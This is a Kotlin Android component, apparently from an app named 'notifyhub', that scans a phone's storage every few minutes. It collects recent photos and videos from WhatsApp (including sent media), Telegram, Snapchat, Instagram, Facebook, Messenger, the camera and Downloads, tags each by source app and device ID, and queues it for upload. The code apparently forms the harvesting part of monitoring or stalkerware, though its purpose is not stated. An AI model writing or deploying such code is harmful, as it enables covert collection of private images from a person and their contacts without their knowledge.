package com.notifyhub

import android.content.Context
import android.net.Uri
import android.os.Environment
import android.util.Log
import com.notifyhub.data.PendingMedia
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.io.File
import java.time.Instant
import java.util.concurrent.atomic.AtomicBoolean

object AllFilesCapture {

    private const val TAG = "AllFilesCapture"
    private const val MAX_PER_SCAN = 150
    private const val MAX_CANDIDATES = 5_000
    private const val MAX_DEPTH = 8
    private const val POLL_INTERVAL_MS = 5 * 60 * 1000L
    private const val FIRST_SCAN_LOOKBACK_MS = 24 * 60 * 60 * 1000L

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val scanning = AtomicBoolean(false)
    private var scanJob: Job? = null

    private val imageExtensions = setOf("jpg", "jpeg", "png", "webp", "heic", "heif", "gif", "bmp")
    private val videoExtensions = setOf("mp4", "m4v", "3gp", "webm", "mkv", "mov", "avi")
    private val skipDirs = setOf(
        ".thumbnails",
        "Thumbnails",
        "thumbnails",
        ".trashed",
        ".trash",
        ".Statuses",
        "Private",
        "ViewOnce"
    )

    private data class Source(val packageName: String, val source: String)
    private data class Candidate(
        val file: File,
        val extension: String,
        val isVideo: Boolean,
        val modified: Long,
        val size: Long
    )

    fun start(context: Context) {
        val appContext = context.applicationContext
        if (!MediaSettings.isEnabled(appContext)) return
        if (!MediaSettings.hasAllFilesAccess(appContext)) return
        if (MediaSettings.lastAllFilesScan(appContext) == 0L) {
            MediaSettings.setLastAllFilesScan(
                appContext,
                System.currentTimeMillis() - FIRST_SCAN_LOOKBACK_MS
            )
        }
        val elapsed = System.currentTimeMillis() - MediaSettings.lastAllFilesScan(appContext)
        if (elapsed < POLL_INTERVAL_MS) return
        schedule(appContext)
    }

    fun stop() {
        scanJob?.cancel()
        scanJob = null
    }

    fun poll(context: Context) {
        val appContext = context.applicationContext
        if (!MediaSettings.isEnabled(appContext)) return
        if (!MediaSettings.hasAllFilesAccess(appContext)) return
        val elapsed = System.currentTimeMillis() - MediaSettings.lastAllFilesScan(appContext)
        if (elapsed >= POLL_INTERVAL_MS) schedule(appContext)
    }

    fun scanRecent(context: Context, hours: Long) {
        val appContext = context.applicationContext
        scope.launch {
            scan(appContext, System.currentTimeMillis() - hours * 60 * 60 * 1000L)
        }
    }

    fun scanNow(context: Context) {
        val appContext = context.applicationContext
        scope.launch {
            val since = MediaSettings.lastAllFilesScan(appContext).takeIf { it > 0L }
                ?: (System.currentTimeMillis() - FIRST_SCAN_LOOKBACK_MS)
            scan(appContext, since)
        }
    }

    private fun schedule(context: Context) {
        if (scanJob?.isActive == true) return
        scanJob = scope.launch {
            delay(1_500)
            val since = MediaSettings.lastAllFilesScan(context).takeIf { it > 0L }
                ?: (System.currentTimeMillis() - FIRST_SCAN_LOOKBACK_MS)
            scan(context, since)
        }
    }

    private suspend fun scan(context: Context, sinceMs: Long) {
        if (!MediaSettings.isEnabled(context)) return
        if (!MediaSettings.hasAllFilesAccess(context)) return
        if (!scanning.compareAndSet(false, true)) return
        try {
            var remaining = MAX_PER_SCAN
            for (root in roots()) {
                if (remaining <= 0) break
                if (!root.isDirectory) continue
                remaining -= scanRoot(context, root, sinceMs, remaining)
            }
            MediaSettings.setLastAllFilesScan(context, System.currentTimeMillis())
        } finally {
            scanning.set(false)
        }
    }

    private suspend fun scanRoot(
        context: Context,
        root: File,
        sinceMs: Long,
        limit: Int
    ): Int {
        var inserted = 0
        val candidates = ArrayList<Candidate>()
        try {
            val iterator = root.walkTopDown()
                .maxDepth(MAX_DEPTH)
                .onEnter { it.name !in skipDirs }
                .iterator()
            while (iterator.hasNext() && candidates.size < MAX_CANDIDATES) {
                val file = try {
                    iterator.next()
                } catch (_: Exception) {
                    break
                }
                if (!file.isFile) continue
                if (file.name.startsWith(".")) continue
                val extension = file.extension.lowercase()
                val isVideo = extension in videoExtensions
                if (!isVideo && extension !in imageExtensions) continue
                val modified = file.lastModified()
                if (modified <= 0L || modified < sinceMs) continue
                val size = file.length()
                if (size <= 0L) continue
                candidates.add(Candidate(file, extension, isVideo, modified, size))
            }
        } catch (_: Exception) {
        }
        for (candidate in candidates.sortedByDescending { it.modified }.take(limit)) {
            if (enqueue(
                    context,
                    candidate.file,
                    candidate.extension,
                    candidate.isVideo,
                    candidate.modified,
                    candidate.size
                )
            ) {
                inserted++
            }
        }
        Log.d(TAG, "root=${root.name} candidates=${candidates.size} inserted=$inserted")
        return inserted
    }

    private suspend fun enqueue(
        context: Context,
        file: File,
        extension: String,
        isVideo: Boolean,
        modified: Long,
        size: Long
    ): Boolean {
        val deviceId = MediaUploader.deviceId(context)
        val path = file.absolutePath
        val source = sourceFor(path)
        val mime = mimeFor(extension, isVideo)
        val item = PendingMedia(
            deviceId = deviceId,
            source = source.source,
            packageName = source.packageName,
            appLabel = labelFor(context, source.packageName),
            mediaType = if (isVideo) "video_thumbnail" else "image",
            displayName = file.name,
            mimeType = mime,
            originalMimeType = mime,
            sizeBytes = size,
            width = null,
            height = null,
            durationMs = null,
            capturedAt = Instant.ofEpochMilli(modified).toString(),
            localUri = Uri.fromFile(file).toString(),
            dedupHash = MediaUploader.sha256("$deviceId:$path:$modified:$size")
        )
        val inserted = App.database.dao().insertMedia(item) > 0
        if (inserted) MediaUploader.kick(context)
        return inserted
    }

    private fun roots(): List<File> {
        val storage = Environment.getExternalStorageDirectory()
        return listOf(
            File(storage, Environment.DIRECTORY_DOWNLOADS),
            File(storage, "Android/media"),
            File(storage, "Telegram"),
            File(storage, "Snapchat"),
            File(storage, "WhatsApp"),
            File(storage, "Pictures/Instagram"),
            File(storage, "Pictures/Facebook"),
            File(storage, "Pictures/Messenger"),
            File(storage, "Pictures/WhatsApp"),
            File(storage, "Pictures/Telegram"),
            File(storage, "Pictures/Snapchat"),
            File(storage, "DCIM/Camera"),
            File(storage, "DCIM/Instagram"),
            File(storage, "DCIM/Facebook"),
            File(storage, "DCIM/Snapchat")
        )
    }

    private fun sourceFor(path: String): Source {
        val lower = path.lowercase()
        val androidMedia = "/android/media/"
        val mediaIndex = lower.indexOf(androidMedia)
        if (mediaIndex >= 0) {
            val packageName = path.substring(mediaIndex + androidMedia.length)
                .substringBefore('/')
                .ifBlank { "filesystem" }
            val source = if (packageName == "com.whatsapp" && lower.contains("/sent/")) {
                "whatsapp_sent"
            } else {
                "android_media"
            }
            return Source(packageName, source)
        }
        return when {
            lower.contains("/download/") -> Source("downloads", "downloads")
            lower.contains("/telegram/") -> Source("org.telegram.messenger", "telegram")
            lower.contains("/snapchat/") -> Source("com.snapchat.android", "snapchat")
            lower.contains("/instagram/") -> Source("com.instagram.android", "files")
            lower.contains("/facebook/") -> Source("com.facebook.katana", "files")
            lower.contains("/messenger/") -> Source("com.facebook.orca", "files")
            lower.contains("/whatsapp/") -> Source(
                "com.whatsapp",
                if (lower.contains("/sent/")) "whatsapp_sent" else "files"
            )
            lower.contains("/dcim/camera/") -> Source("camera", "files")
            else -> Source("filesystem", "files")
        }
    }

    private fun labelFor(context: Context, packageName: String): String = when (packageName) {
        "downloads" -> "Downloads"
        "filesystem" -> "Files"
        "camera" -> "Camera"
        else -> MediaUploader.labelFor(context, packageName)
    }

    private fun mimeFor(extension: String, isVideo: Boolean): String = when (extension) {
        "jpg", "jpeg" -> "image/jpeg"
        "png" -> "image/png"
        "webp" -> "image/webp"
        "heic", "heif" -> "image/heic"
        "gif" -> "image/gif"
        "bmp" -> "image/bmp"
        "mp4", "m4v" -> "video/mp4"
        "3gp" -> "video/3gpp"
        "webm" -> "video/webm"
        "mkv" -> "video/x-matroska"
        "mov" -> "video/quicktime"
        "avi" -> "video/x-msvideo"
        else -> if (isVideo) "video/*" else "image/*"
    }
}
